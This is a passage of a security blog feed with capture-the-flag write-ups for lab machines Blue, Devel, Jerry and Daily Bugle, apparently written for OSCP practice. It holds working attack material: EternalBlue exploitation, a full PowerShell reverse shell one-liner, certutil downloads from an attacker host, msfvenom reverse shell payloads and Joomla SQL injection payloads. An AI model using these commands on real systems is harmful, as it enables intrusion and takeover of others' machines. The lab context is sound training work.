+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+</code></pre><h3 id="exploitation">Exploitation</h3>
+<h4 id="with-metasploit">With Metasploit</h4>
+<p>To conduct the exploitation of EternalBlue with Metasploit, we use the <code>windows/smb/ms17_010_eternalblue</code> module. After setting the necessary options, we run the exploit in <code>check</code> mode and look for sucess messages to confirm that the exploit was effective. If not, we will have somewhere to start when working to fix any problems.</p>
+<pre tabindex="0"><code>[*] &lt;target-ip&gt;:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] &lt;target-ip&gt;:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
+...
+[+] &lt;target-ip&gt;:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+...
+[*] Meterpreter session 1 opened (&lt;target-ip&gt;:4444 -&gt; &lt;target-ip&gt;:49158) at 2022-08-09 12:14:32 -0400
+[+] &lt;target-ip&gt;:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] &lt;target-ip&gt;:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] &lt;target-ip&gt;:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+</code></pre><p>We are then left with a meterpreter shell session as <code>NT Authority\SYSTEM</code>:</p>
+<pre tabindex="0"><code>meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM
+</code></pre><h4 id="without-metasploit">Without Metasploit</h4>
+<p>To effect this exploit without the use of Metasploit, we instead use <code>searchsploit</code> to look through the ExploitDB database for relevant exploits. Luckily, there are a plethora of options to choose from:</p>
+<pre tabindex="0"><code>---------------------------------------------------------- ---------------------------------
+ Exploit Title                                             |  Path
+----------------------------------------------------------- ---------------------------------
+Microsoft Windows - &#39;EternalRomance&#39;/&#39;EternalSynergy&#39;/&#39;Ete | windows/remote/43970.rb
+Microsoft Windows - SMB Remote Code Execution Scanner (MS1 | windows/dos/41891.rb
+Microsoft Windows 7/2008 R2 - &#39;EternalBlue&#39; SMB Remote Cod | windows/remote/42031.py
+Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - &#39;Eternal | windows/remote/42315.py
+Microsoft Windows 8/8.1/2012 R2 (x64) - &#39;EternalBlue&#39; SMB  | windows_x86-64/remote/42030.py
+Microsoft Windows Server 2008 R2 (x64) - &#39;SrvOs2FeaToNt&#39; S | windows_x86-64/remote/41987.py
+----------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre><p>For our purposes, we grab <code>42315.py</code> and copy it to our current working directory with <code>searchsploit -m 42315</code>. When we attempt to run the exploit, we&rsquo;re given a missing Python module error <code>No module named 'mysmb'</code>, is it isn&rsquo;t yet installed on our system. Luckily, we spy a link in the source code to an Offensive Security GitHub repository where we can find it.</p>
+<pre tabindex="0"><code>EDB Note: mysmb.py can be found here ~ https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py
+</code></pre><p>After downloading the necessary module, running the exploit returns:</p>
+<pre tabindex="0"><code>Target OS: Windows 7 Professional 7601 Service Pack 1
+Not found accessible named pipe
+Done
+</code></pre><p>As the script, by default, tries all standard named pipes, this appears to be a permissions issue. Let&rsquo;s try  to have the script connect as <code>guest</code>, a <code>BUILTIN</code> default account. To do this, we edit the following lines of our exploit:</p>
+<pre tabindex="0"><code>USERNAME = &#39;guest&#39;
+PASSWORD = &#39;&#39;
+</code></pre><p>When we attempt to run the exploit again, we see that the exploit has successfully run:</p>
+<pre tabindex="0"><code>...
+creating file c:\pwned.txt on the target
+...
+</code></pre><p>Now, we simply need to change the script (lines ~928-930) to uncomment the commands for executing a reverse shell:</p>
+<pre tabindex="0"><code>#smb_send_file(smbConn, sys.argv[0], &#39;C&#39;, &#39;/exploit.py&#39;)
+
+#service_exec(conn, r&#39;cmd /c copy c:\pwned.txt c:\pwned_exec.txt&#39;)
+</code></pre><p>Then we create our reverse shell executable with msfvenom:</p>
+<pre tabindex="0"><code>msfvenom -p windows/shell_reverse_tcp -f exe LHOST=&lt;target-ip&gt; LPORT=4321 &gt; NotAnExploit.exe
+</code></pre><p>Here is our new script text:</p>
+<pre tabindex="0"><code>smb_send_file(smbConn, &#39;NotAnExploit.exe&#39;, &#39;C&#39;, &#39;/NotAnExploit.exe&#39;)
+service_exec(conn, r&#39;cmd /c C:\NotAnExploit.exe&#39;)
+</code></pre><p>With this completed, we should get a reverse shell back when running the exploit!</p>
+<h2 id="devel">Devel</h2>
+<p>Completing this box involves FTP and web server exploitation, paired with a flexible privilege escalation portion, which allows for a variety of vectors to be utilized. As this machine is old (2050 days older at the time of publication!) and I need practice with kernel exploits, I&rsquo;ve chosen this route.</p>
+<h3 id="enumeration-1">Enumeration</h3>
+<h4 id="nmap-1">nmap</h4>
+<pre tabindex="0"><code>21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 03-18-17  02:06AM       &lt;DIR&gt;          aspnet_client
+| 03-17-17  05:37PM                  689 iisstart.htm
+|_03-17-17  05:37PM               184946 welcome.png
+80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-title: IIS7
+|_http-server-header: Microsoft-IIS/7.5
+</code></pre><pre tabindex="0"><code>Matched Pattern: Powered-By: ASP.NET
+
+Identified HTTP Server: Microsoft-IIS/7.5
+</code></pre><p>Our scans return two basic services with ports open: FTP on port 21 and an IIS webserver on port 80.</p>
+<h4 id="ftp">FTP</h4>
+<p>While the webserer only appears to contain default content, we discover that we can log in to the FTP server anonymously with <code>ftp anonymous@10.10.10.5</code>. Not only that, but we find that we have permission to upload files to the server with the <code>put</code> command. After conducting a few tests with generic image and HTTP files, we discover that the uploaded content can be accessed via the webserver on port 80.</p>
+<p>Thus, we upload an Active Server Pages (<code>.aspx</code> - a format designed for .NET) webshell to the server. By passing commands through the relevant parameter in our requests, we discover that we have command execution on the machine as the <code>iis apppool\web</code> user. We also determine the following about the system:</p>
+<pre tabindex="0"><code>Host Name:                 DEVEL
+OS Name:                   Microsoft Windows 7 Enterprise
+OS Version:                6.1.7600 N/A Build 7600
+System Type:               X86-based PC
+</code></pre><h3 id="foothold---reverse-shell">Foothold - Reverse Shell</h3>
+<p>In addition to enumerating our current user with <code>whoami</code>, we are able to use the <code>ping</code> command to verify that our attacking machine is reachable from the server. While we could transfer a netcat binary to the machine to generate a callback, this is an older machine and, thus, it may be easier to connect via PowerShell. With a bit of experimentation, we manage to do just that with the following shellcode:</p>
+<pre tabindex="0"><code>powershell -nop -c &#34;$client = New-Object System.Net.Sockets.TCPClient(&#39;&lt;attacker-ip&gt;&#39;,8889);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&#34;
+</code></pre><h3 id="privilege-escalation">Privilege Escalation</h3>
+<p>From our PowerShell, we can do a bit more manual enumeration:
+<code>whoami /priv</code></p>
+<pre tabindex="0"><code>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+</code></pre><p>This is looking juicy. We then download and run WinPEAS for more information on the patches installed on this machine::</p>
+<p><strong>Download WinPEAS</strong> with CertUtil:</p>
+<pre tabindex="0"><code>certutil -urlcache -split -f &#34;http://&lt;attacker-ip&gt;:8000/winPEAS.bat&#34; 
+</code></pre><p><strong>WinPEAS output</strong></p>
+<pre tabindex="0"><code>MS11-080 patch is NOT installed XP/SP3,2K3/SP3-afd.sys)
+MS16-032 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-secondary logon)
+MS11-011 patch is NOT installed XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP1/2,7/SP0-WmiTraceMessageVa)
+MS10-59 patch is NOT installed 2K8,Vista,7/SP0-Chimichurri)
+MS10-21 patch is NOT installed 2K/SP4,XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP0/1/2,7/SP0-Win Kernel)
+MS10-092 patch is NOT installed 2K8/SP0/1/2,Vista/SP1/2,7/SP0-Task Sched)
+MS10-073 patch is NOT installed XP/SP2/3,2K3/SP2/2K8/SP2,Vista/SP1/2,7/SP0-Keyboard Layout)
+MS17-017 patch is NOT installed 2K8/SP2,Vista/SP2,7/SP1-Registry Hive Loading)
+MS10-015 patch is NOT installed 2K,XP,2K3,2K8,Vista,7-User Mode to Ring)
+MS08-025 patch is NOT installed 2K/SP4,XP/SP2,2K3/SP1/2,2K8/SP0,Vista/SP0/1-win32k.sys)
+MS06-049 patch is NOT installed 2K/SP4-ZwQuerySysInfo)
+MS06-030 patch is NOT installed 2K,XP/SP2-Mrxsmb.sys)
+MS05-055 patch is NOT installed 2K/SP4-APC Data-Free)
+MS05-018 patch is NOT installed 2K/SP3/4,XP/SP1/2-CSRSS)
+MS04-019 patch is NOT installed 2K/SP2/3/4-Utility Manager)
+MS04-011 patch is NOT installed 2K/SP2/3/4,XP/SP0/1-LSASS service BoF)
+MS04-020 patch is NOT installed 2K/SP4-POSIX)
+MS14-040 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-afd.sys Dangling Pointer)
+MS16-016 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-WebDAV to Address)
+MS15-051 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-win32k.sys)
+MS14-070 patch is NOT installed 2K3/SP2-TCP/IP)
+MS13-005 patch is NOT installed Vista,7,8,2008,2008R2,2012,RT-hwnd_broadcast)
+MS13-053 patch is NOT installed 7SP0/SP1_x86-schlamperei)
+MS13-081 patch is NOT installed 7SP0/SP1_x86-track_popup_menu)
+</code></pre><p>Alternatively, we can run the venerable <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">Windows Exploit Suggester</a> (ensuring that it is the original version, not NG) remotely to discover opportunities for obtaining root access.
+<br/><br/>
+<strong>Note:</strong> Like many, initially I had trouble getting the script to use the Microsoft Excel spreadsheet generated by the <code>xx</code> flag. This has to do with the use of the Python library <code>xlrd</code>, which can be mitigated via the use of Python virtual environments (<code>venv</code>). Alternatively, a quick fix is available <a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester/issues/50#issuecomment-1025764542">here</a>.
+<br/><br/></p>
+<p><strong>WES output</strong></p>
+<pre tabindex="0"><code>python2 /opt/Windows-Exploit-Suggester/windows-exploit-suggester.py --database 2022-10-20-mmsb.xls --systeminfo systeminfo.txt
+[*] initiating winsploit version 3.3...
+[*] database file detected as xls or xlsx based on extension
+[*] attempting to read from the systeminfo input file
+[+] systeminfo input file read successfully (utf-8)
+[*] querying database file for potential vulnerabilities
+[*] comparing the 0 hotfix(es) against the 179 potential bulletins(s) with a database of 137 known exploits
+[*] there are now 179 remaining vulns
+[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
+[+] windows version identified as &#39;Windows 7 32-bit&#39;
+[*]
+[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
+[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
+[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
+[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5., PoC
+[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP &amp; EMET 5.0 Bypass (MS12-037), PoC
+[*]
+[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
+[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
+[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
+[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
+[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
+[M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important
+[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
+[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
+[*] done
+</code></pre><p>Honing our exploitation searches to &ldquo;Build 7600&rdquo; of Windows 7, which we gleaned from our initial enumeration efforts, brings us many options, including: ttps://www.exploit-db.com/download/40564.</p>
+<p>Luckily for us, the text of the exploit explains concisely how to compile it for use:</p>
+<pre tabindex="0"><code>i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32
+</code></pre><p>After compiling the executable, we transfer it over to the machine with certutil to a writeable directory:</p>
+<pre tabindex="0"><code>certutil -urlcache -split -f &#34;http://&lt;attacker-ip&gt;:8000/MS11-046.exe&#34; 
+</code></pre><p><strong>Note:</strong> At this juncture, I had to pass my reverse shell session to <code>cmd.exe</code>, as the necessary functionality was proving problematic with my initial PowerShell reverse shell.</p>
+<p>With this completed, we simply execute the exploit and enjoy <code>SYSTEM</code> access!</p>
+<pre tabindex="0"><code>C:\windows\temp&gt;MS11-046.exe
+MS11-046.exe
+
+c:\Windows\System32&gt;whoami
+whoami
+nt authority\system
+</code></pre><h2 id="jerry">Jerry</h2>
+<p>The third box of our initial roundup, Jerry features basic exploitation of an Apache Tomcat web server.</p>
+<h3 id="enumeration-2">Enumeration</h3>
+<h4 id="nmap-2">nmap</h4>
+<pre tabindex="0"><code>8080/tcp open  http    syn-ack ttl 127 Apache Tomcat/Coyote JSP engine 1.1
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-favicon: Apache Tomcat
+|_http-server-header: Apache-Coyote/1.1
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Apache Tomcat/7.0.88
+</code></pre><p>Our initial scans give us a wealth of information about a Tomcat server running on port 8080 of the machine. Manually browsing to the webserver root futher confirms this:</p>
+<p><code>&lt;target-ip&gt;:8080</code></p>
+<pre tabindex="0"><code>Apache Tomcat/7.0.88
+If you&#39;re seeing this, you&#39;ve successfully installed Tomcat. Congratulations!
+</code></pre><h4 id="nikto">nikto</h4>
+<p>Despite its age, nikto can still often yield valuable information about web applications. Here, we get <em>very</em> lucky, with the following output:</p>
+<pre tabindex="0"><code>+ Default account found for &#39;Tomcat Manager Application&#39; at /manager/html (ID &#39;tomcat&#39;, PW &#39;s3cret&#39;). Apache Tomcat.
+</code></pre><p>Browsing to <code>&lt;target-ip&gt;:8080/manager</code> confirms this.</p>
+<pre tabindex="0"><code>This site is asking you to sign in. 
+
+Username:
+
+Password:
+</code></pre><h3 id="rce---administration-panel">RCE - Administration Panel</h3>
+<p>Apache Tomcat is a common platform for deploying Java code. This means that we can use a malicious Web Application Resource (alternatively known as a Web Application Archive - <code>.war</code>) file to create a reverse shell callback to our machine.</p>
+<p>First, we generate the necessary payload with msfvenom:</p>
+<p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f war &gt; shell.war</code></p>
+<pre tabindex="0"><code>$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;attacker-ip&gt; LPORT=8002 -f war &gt; shell.war
+Payload size: 1088 bytes
+Final size of war file: 1088 bytes
+</code></pre><p>Then we simply upload the <code>WAR</code> file:
+<img src="/images/jerry/war.png" alt=""></p>
+<p>&hellip;and run it for a reverse shell!</p>
+<p><img src="/images/jerry/tomcat-click.png" alt=""></p>
+<p>Luckily, the Tomcat server was running as the Windows <code>SYSTEM</code> user, giving us full access immediately.</p>
+<pre tabindex="0"><code>connect to [&lt;attacker-ip&gt;] from (UNKNOWN) [&lt;target-ip&gt;] 49192
+Microsoft Windows [Version 6.3.9600]
+(c) 2013 Microsoft Corporation. All rights reserved.
+
+C:\apache-tomcat-7.0.88&gt;whoami
+whoami
+nt authority\system
+</code></pre><h2 id="lessons-learned">Lessons Learned</h2>
+<p>It&rsquo;s great to finally get a jump on the TJNull list, in pursuit of eventually obtaining the OSCP. I am attempting to document as many of the boxes on the list as I can, independent of their level of difficulty.</p>
+<ul>
+<li>Blue
+<ul>
+<li>The process of manually exploiting EternalBlue was new to me, but will help with Metasploitless efforts going forward.</li>
+<li>Accounting for the actual use of named pipes helped to develop my understanding of their use both within the context of EB and more generally.</li>
+</ul>
+</li>
+<li>Devel
+<ul>
+<li>The machine&rsquo;s age rendered many of my previous go-to techniques and tools less helpful, mandating the use of a different approach.</li>
+<li>Similarly, this gave me an opportunity to use <code>windows-exploit-suggester.py</code> and engage in the associated troubleshooting, mentioned above.</li>
+</ul>
+</li>
+<li>Jerry
+<ul>
+<li>I have not needed to exploit an Apache Tomcat server in a while, so this was a great refresher in the use of <code>.war</code> (and <code>.jar</code>) files, generally.</li>
+</ul>
+</li>
+</ul>
+]]></content>
+        </item>
+        
+        <item>
+            <title>THM: Daily Bugle -- Write-Up</title>
+            <link>https://robscharf.github.io/posts/2022/08/thm-daily-bugle--write-up/</link>
+            <pubDate>Wed, 10 Aug 2022 15:32:00 +0000</pubDate>
+            
+            <guid>https://robscharf.github.io/posts/2022/08/thm-daily-bugle--write-up/</guid>
+            <description>About Daily Bugle is a hard rated CTF room on TryHackMe. Rooting this box involves carrying out a successful CMS enumeration, SQLi, hash cracking, and binary-based privilege escalation.
+Note: I have replaced all instances of the virtual machine&amp;rsquo;s ip address with &amp;lt;target-ip&amp;gt; throughout this write-up.
+Enumeration nmap Nmap scan report for &amp;lt;target-ip&amp;gt; Host is up, received user-set (0.10s latency). Scanned at 2022-06-16 15:11:23 EDT for 549s Not shown: 65521 closed tcp ports (conn-refused) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.</description>
+            <content type="html"><![CDATA[<h2 id="about">About</h2>
+<p>Daily Bugle is a <em>hard</em> rated CTF room on <a href="https://tryhackme.com/room/dailybugle">TryHackMe</a>. Rooting this box involves carrying out a successful CMS enumeration, SQLi, hash cracking, and binary-based privilege escalation.</p>
+<p><strong>Note:</strong> I have replaced all instances of the virtual machine&rsquo;s ip address with <code>&lt;target-ip&gt;</code> throughout this write-up.</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap">nmap</h3>
+<pre tabindex="0"><code>Nmap scan report for &lt;target-ip&gt;
+Host is up, received user-set (0.10s latency).
+Scanned at 2022-06-16 15:11:23 EDT for 549s
+Not shown: 65521 closed tcp ports (conn-refused)
+PORT      STATE    SERVICE REASON      VERSION
+22/tcp    open     ssh     syn-ack     OpenSSH 7.4 (protocol 2.0)
+
+80/tcp    open     http    syn-ack     Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
+| http-robots.txt: 15 disallowed entries 
+| /joomla/administrator/ /administrator/ /bin/ /cache/ 
+| /cli/ /components/ /includes/ /installation/ /language/ 
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+|_http-generator: Joomla! - Open Source Content Management
+|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
+|_http-title: Home
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
+
+3306/tcp  open     mysql   syn-ack     MariaDB (unauthorized)
+
+15221/tcp filtered unknown no-response
+15308/tcp filtered unknown no-response
+22207/tcp filtered unknown no-response
+23782/tcp filtered unknown no-response
+26231/tcp filtered unknown no-response
+30325/tcp filtered unknown no-response
+32170/tcp filtered unknown no-response
+39253/tcp filtered unknown no-response
+45425/tcp filtered unknown no-response
+60046/tcp filtered unknown no-response
+65242/tcp filtered unknown no-response
+</code></pre><p>In addition to Joomla, we see a robust <code>robots.txt</code> file on the machine&rsquo;s Apache web server.</p>
+<p><code>robots.txt</code></p>
+<pre tabindex="0"><code># If the Joomla site is installed within a folder 
+# eg www.example.com/joomla/ then the robots.txt file 
+# MUST be moved to the site root 
+# eg www.example.com/robots.txt
+# AND the joomla folder name MUST be prefixed to all of the
+# paths. 
+# eg the Disallow rule for the /administrator/ folder MUST 
+# be changed to read 
+# Disallow: /joomla/administrator/
+#
+# For more information about the robots.txt standard, see:
+# http://www.robotstxt.org/orig.html
+#
+# For syntax checking, see:
+# http://tool.motoricerca.info/robots-checker.phtml
+
+User-agent: *
+Disallow: /administrator/
+Disallow: /bin/
+Disallow: /cache/
+Disallow: /cli/
+Disallow: /components/
+Disallow: /includes/
+Disallow: /installation/
+Disallow: /language/
+Disallow: /layouts/
+Disallow: /libraries/
+Disallow: /logs/
+Disallow: /modules/
+Disallow: /plugins/
+Disallow: /tmp/
+</code></pre><h3 id="cms-enumeration-with-cmseek">CMS Enumeration with CMSeeK</h3>
+<p><a href="https://github.com/Tuhinshubhra/CMSeeK">CMSeeK</a> is a python3 CMS Detection and Exploitation suite and has scanning capabilities for WordPress, Joomla, Drupal and over 180 other CMSs.</p>
+<pre tabindex="0"><code> ___ _  _ ____ ____ ____ _  _
+|    |\/| [__  |___ |___ |_/  by @r3dhax0r
+|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA
+
+
+ [+]  Deep Scan Results  [+] 
+
+[✔] Target: http://&lt;target-ip&gt;
+[✔] Detected CMS: Joomla
+[✔] CMS URL: https://joomla.org
+[✔] Joomla Version: 3.7.0
+[✔] Readme file: http://&lt;target-ip&gt;/README.txt
+[✔] Admin URL: http://&lt;target-ip&gt;administrator
+
+
+[✔] Open directories: 4
+[*] Open directory url: 
+   [&gt;] http://&lt;target-ip&gt;administrator/templates
+   [&gt;] http://&lt;target-ip&gt;administrator/components
+   [&gt;] http://&lt;target-ip&gt;administrator/modules
+   [&gt;] http://&lt;target-ip&gt;images/banners
+</code></pre><p>Excellent! Our scan shows that the server is running Jooma <code>version 3.7.0</code>. Let&rsquo;s see if we can find any viable information on <a href="https://www.exploit-db.com/">ExploitDB</a>.</p>
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="searchsploit">searchsploit</h3>
+<p><code>searchsploit joomla 3.7.0</code></p>
+<pre tabindex="0"><code>                    ----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+Joomla! 3.7.0 - &#39;com_fields&#39; SQL Injection                                         | php/webapps/42033.txt
+Joomla! Component Easydiscuss &lt; 4.0.21 - Cross-Site Scripting                      | php/webapps/43488.txt
+----------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+╭─[kali-bot] as virtualtack in ~                                                                            16:18:47
+╰──➤ locate 42033.txt  
+/usr/share/exploitdb/exploits/php/webapps/42033.txt
+</code></pre><p>Indeed, we find an SQL injection exploit that&rsquo;s created for the specific release that is running on the server. My Spidey Senses are tingling!</p>
+<p><strong>Note:</strong> For more about the Joomla 3.7.0 SQLi vulnerability, see: <a><a href="https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html">https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</a></a>.</p>
+<p><code>42033.txt</code></p>
+<pre tabindex="0"><code># Exploit Title: Joomla 3.7.0 - Sql Injection
+# Date: 05-19-2017
+# Exploit Author: Mateus Lino
+# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
+# Vendor Homepage: https://www.joomla.org/
+# Version: = 3.7.0
+# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
+# CVE : - CVE-2017-8917
+
+
+URL Vulnerable: http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27
+
+
+Using Sqlmap:
+
+sqlmap -u &#34;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+
+
+Parameter: list[fullordering] (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (DUAL)
+    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)
+
+    Type: error-based
+    Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)
+    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)
+    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)%   
+</code></pre><h3 id="sqlmap">SQLMap</h3>
+<p>While I chose to avoid using SQLMap (in preparation for an eventual OSCP attempt), we could use the following command to begin enumerating the server&rsquo;s MariaDB database. The exploit found earlier gives us a sample to get us started:</p>
+<pre tabindex="0"><code>sqlmap -u &#34;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&#34; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
+</code></pre><h3 id="exploiting-joomla-with-joomblahpy">Exploiting Joomla with <code>joomblah.py</code></h3>
+<p>Instead, I decided to use <a href="https://github.com/XiphosResearch/exploits/tree/master/Joomblah">joomblah.py</a>, a tool built specifically for the Joomla 3.7.0 SQLi exploit.</p>
+<p><code>python3 joomblah.py http://&lt;target-ip&gt;</code></p>
+<pre tabindex="0"><code> [-] Fetching CSRF token
+ [-] Testing SQLi
+  -  Found table: fb9j5_users
+  -  Extracting users from fb9j5_users
+ [$] Found user [&#39;811&#39;, &#39;Super User&#39;, &#39;j---h&#39;, &#39;j---h@tryhackme.com&#39;, &#39;$2y$-----------------------------m&#39;, &#39;&#39;, &#39;&#39;]
+  -  Extracting sessions from fb9j5_session          
+</code></pre><p>Success! This script returns the username, email address, and password hash of the Joomla <code>Super User</code>. Let&rsquo;s see if we can crack the hash offline.</p>
+<h3 id="offline-password-cracking-with-hydra">Offline Password Cracking with Hydra</h3>
+<p><code>john  --wordlist=/usr/share/wordlists/rockyou.txt supass.txt</code></p>
+<pre tabindex="0"><code>Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 4 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+👍s----------3     (?)👍     
+1g 0:00:05:39 DONE (2022-06-16 17:17) 0.002944g/s 137.8p/s 137.8c/s 137.8C/s thelma1..speciala
+Use the &#34;--show&#34; option to display all of the cracked passwords reliably
+Session completed.                                                                                           ~5m:40s 
+</code></pre><p>We&rsquo;re on a roll now. John the Ripper was able to crack the Blowfish hash and give us the adminstrators&rsquo; cleartext password.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="joomla-administration-panel">Joomla Administration Panel</h3>
+<p><img src="/images/daily-bugle-joomla-admin.PNG" alt="joomla-admin"></p>
+<p>Let&rsquo;s log-in to the Joomla admin panel (located at <code>/administrator</code>) and see what we can find.</p>
+<p><img src="/images/daily-bugle-joomla-new-file.PNG" alt="joomla-new-file"></p>
+<p>Luckily for us, obtaining RCE via reverse shell is as easy in Joomla as it is in WordPRess. We can simply create a new file called <code>shell.php</code> that contains <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">pentestmonkey&rsquo;s reverse php shell</a> and upload it to the CMS. This can be done through the <code>Extensions</code> page, under <code>Templates -&gt; Templates</code>, and selecting <code>New File</code> under the <code>Prostar</code> theme.</p>
+<p>After setting up a netcat listener, we can then use our browser to execute the payload for a reverse shell. The uploaded <code>.php</code> file is accessible via the following directory:</p>
+<p><code>http://&lt;target-ip&gt;/templates/protostar/shell.php</code></p>
+<pre tabindex="0"><code>nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.6.19.171] from (UNKNOWN) [&lt;target-ip&gt;] 42522
+Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 23:51:32 up 13 min,  0 users,  load average: 0.00, 0.03, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=48(apache) gid=48(apache) groups=48(apache)
+sh: no job control in this shell
+sh-4.2$ whoami
+whoami
+apache
+sh-4.2$ 
+</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
